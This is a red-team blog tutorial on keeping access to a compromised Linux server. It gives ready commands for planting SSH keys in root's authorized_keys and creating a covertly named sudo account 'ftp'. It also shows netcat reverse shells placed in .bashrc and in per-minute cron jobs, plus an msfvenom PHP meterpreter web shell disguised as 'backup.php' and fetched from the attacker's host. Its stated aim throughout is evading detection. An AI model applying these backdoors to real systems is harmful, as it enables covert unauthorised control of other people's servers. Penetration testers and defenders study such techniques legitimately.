---
layout: post
title: Linux Persistence Techniques
date: 2023-02-17 20:18 +0300
categories: [Cybersecurity, Red Teaming]
tags: [linux, persistence]
---





SSh Keys, Local Accounts, Web Shells & Cron Jobs
------------------------------------------------

The Persistence strategy presents us with a systematic approach for acquiring and establishing sustained access on the target system.

We will examine the following essential techniques and sub-techniques in our exploration of this approach:

*   Account Manipulation
*   Persistence via SSH Keys
*   Creating a privileged local account
*   Unix shell configuration modification
*   Backdooring the .bashrc file
*   Web Shell/Backdoor
*   Cron jobs

Scenario
--

After gaining an initial foothold, our goal is to establish persistence on the Linux target.

Please note that certain persistence techniques requires "root" privileges to be executed successfully.

Persistence Via SSH Keys
--

Our initial persistence technique involves generating and utilizing SSH key-based authentication instead of password-based authentication. This technique can help maintain access to the target system in the event of user account password changes, a common practice in companies with password security policies.

Please note that Public Key Authentication must be enabled in the SSH configuration file for this technique to work. More information on enabling this feature can be found here: [https://www.linode.com/docs/guides/use-public-key-authentication-with-ssh/](https://www.linode.com/docs/guides/use-public-key-authentication-with-ssh/)

To execute this technique, you must first gain initial access to the target system and have "root" privileges if you wish to modify the SSH configuration file.

The first step is to generate the SSH key-pair, which must be performed on the Kali VM since it is the system used for SSH authentication. Use the following command:

```bash
ssh-keygen
```

The screenshot below emphasizes that you will be prompted to indicate where the public and private keys will be stored, as well as a passphrase for the SSH key. In this instance, we will stick with the default settings.

![](../../assets/img/redteam/pt2.png)

Once the public and private key pair has been generated, you must copy the contents of the public key (id\_rsa.pub) and append it to the "authorized\_keys" file located in the target user account's .ssh directory on the target system.

```bash
/root/.ssh/authorized_keys
```

For this purpose, we will append the public key to the "authorized\_keys" file of the "root" user.

Please note that if the .ssh directory and "authorized\_keys" file do not exist, you will need to create them. You can accomplish this by executing the following commands:

```bash
mkdir ~/.ssh
```

```bash
touch ~/.ssh/authorized_keys
```

Once you have pasted the public key's contents into the "authorized\_keys" file, it should resemble the screenshot displayed below.

![](../../assets/img/redteam/pt3.png)

It is also recommended to apply the necessary permissions to the .ssh directory and “authorized\_keys” file, this can be done by running the following commands:

```bash
chmod 700 /root/.ssh
```

```bash
chmod 600 /root/.ssh/authorized_keys
```

As shown in the following screenshot, after adding the public key you generated, you will now be able to authenticate to the target via SSH without providing a password.

![](../../assets/img/redteam/pt4.png)

We have now been able to successfully set up persistent access via SSH keys and consequently mitigating any future authentication failures caused by changed passwords.

Creating A Privileged Local Account
--

The subsequent persistence technique we will examine is creating a privileged local account for backdoor access. This technique can be utilized to retain access to a target system in the event of a user account password change. However, creating a local user account may increase the likelihood of detection on servers with fewer user and service accounts since a new user will be more easily noticeable.

To avoid detection, we will generate a user account with a covert name. In this example, we will establish a user account named "ftp" to merge with service accounts.

Note: You will require “root” privileges in order to create a new user account on Linux systems.

We can create the user account on the target by running the following command:

```bash
useradd  -m -s /bin/bash ftp
```

After creating the account, we will need to add the user to the “sudo” group, this will provide the user with administrative privileges, this can be done by running the following command:

```bash
usermod -aG sudo ftp
```

After adding the user account to the “sudo” group, we will need to setup a password for the account, this can be done by running the following command:

```bash
passwd ftp
```

After specifying the password, we can list out the contents of the /etc/passwd file to confirm that the user account has been added.

![](../../assets/img/redteam/pt5.png)

You can now authenticate with the new user account via SSH password authentication, alternatively, you can also add the ssh public key we generated in the first section to the “authorized\_keys” file in the user account’s home password.

After authenticating with the server via SSH, we can confirm that the user account has administrative privileges by using the sudo command.

![](../../assets/img/redteam/pt6.png)

As shown in the preceding screenshot, the user account has administrative privileges and can run any command on the system without accessing or interacting with a “root” account.

This account can be used for backdoor access whenever you want to avoid using the “root” account or any other legitimate user accounts on the target system and ensures that you have overt access to the target.

Unix Shell Configuration Modification
--

This persistence technique will involve adding a bash reverse command that will connect back to our netcat listener in a user account’s .bashrc file. The .bashrc file is a config file that is used to customize bash and is executed when a user logs in with the bash shell.

The first step will involve opening the .bashrc file with a text editor This can be done by running the following command:

```bash
nano ~/.bashrc
```

After opening the file with a text editor, we can add a simple bash command that will provide us with a reverse shell whenever a user logs in. This can be done by adding the following command:

```bash
nc -e /bin/bash <KALI-IP> <PORT>  2>/dev/null
```

As shown in the following screenshot, the command should contain your Kali IP and the port netcat is listening on.

![](../../assets/img/redteam/pt7.png)

After adding the bash command to the .bashrc file, we can set up a listener with Netcat on Kali by running the following command:

```bash
nc -nvlp <PORT>
```

Whenever a user logs in to the user account, the command in the .bashrc file will be executed and will consequently provide you with a reverse shell on the netcat listener as shown in the following screenshot.

![](../../assets/img/redteam/pt8.png)

We have now been able to set up persistence via the .bashrc file, this technique has the added advantage of being harder to detect as the reverse shell command is hidden within a legitimate configuration file.

Persistence Via Web Shell
--

This persistence technique involves generating and uploading a PHP web shell to the target server. Given that the target server is running the LAMP stack, we can create a PHP meterpreter payload and upload it to the web server as a backdoor.

The first step will involve generating the PHP meterpreter payload with Msfvenom, this can be done by running the following command:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -e php/base64 -f raw > backup.php
```

In order to evade detection, we will save the payload with a filename of “backup.php”.

Once you have generated the payload, you will need to modify it by adding the PHP tags so that the script is executed correctly as shown in the following screenshot.

![](../../assets/img/redteam/pt9.png)

We can now set up the listener with Metasploit by running the following commands:

```bash
msfconsole
```

```bash
use multi/handler
```

```bash
set payload php/meterpreter/reverse_tcp
```

```bash
set LHOST
```

```bash
set LPORT
```

```bash
run
```

The next step will involve uploading the PHP shell that we just generated to the web server, this can be done by setting up a local web server on the Kali VM and downloading it on the target.

```bash
sudo python -m SimpleHTTPServer 80
```

```bash
wget http://<KALI-IP>/backup.php
```

In this case, we will be uploading the “backup.php” file to the root of the webserver under the /var/www/html directory as shown in the following screenshot.

![](../../assets/img/redteam/pt10.png)

We can retrieve a meterpreter session on the target by navigating to the “backup.php” file on the webserver by accessing the following URL with your browser:

```bash
http://< SERVER-IP>/backup.php<
```

Accessing the through the browser should execute the PHP code and consequently provide you with a meterpreter session on your listener as shown in the following screenshot.

![](../../assets/img/redteam/pt11.png)

We have been able to successfully set up persistence by uploading a meterpreter web shell that allows us to maintain access to the target server without authenticating via SSH.

Persistence Via Cron Jobs
--

This technique involves leveraging Cron jobs to maintain persistent access to the target system by executing a reverse shell command or a web shell repeatedly on a specified schedule.

Cron is a time-based service that runs applications, scripts, and other commands repeatedly on a specified schedule.

Cron provides you with the ability to run a program, script, or command periodically at whatever time you choose, these Cron jobs are then stored in the “crontab” file.

We can add a cron job on the target system by editing the crontab file, this can be done by running the following command on the target system:

```bash
crontab -e
```

We can now add a new cron job that will execute a netcat command every minute, this can be done by adding the following line to the crontab file:

```bash
* * * * * nc <KALI-IP><PORT> -e /bin/sh
```

As shown in the following screenshot, this cron job will connect to a netcat listener every minute.

![](../../assets/img/redteam/pt12.png)

After adding the cron job, you will need to save the file, after which, you should be presented with a message similar to the one shown in the following screenshot.

![](../../assets/img/redteam/pt13.png)

We can now set up our netcat listener by running the following command on Kali:

  ```bash
  nc -nvlp
  ```

After one minute, the cron job will be executed and you should receive a reverse shell on your netcat listener as shown in the following screenshot.

![](../../assets/img/redteam/pt14.png)

Alternatively, instead of using netcat to obtain a reverse shell, we can create a cron job that executes the PHP meterpreter shell we created and uploaded in the previous section. This can be done by adding the following line to the crontab file:

```bash
* * * * * php -f /var/www/html/backup.php
```

As shown in the following screenshot, after one minute you should receive a meterpreter session.

![](../../assets/img/redteam/pt15.png)

Persistence has been established on the target server by generating a cron job that connects back to our listener. Furthermore, a cron job has been established to execute the PHP meterpreter shell we uploaded to the target server.
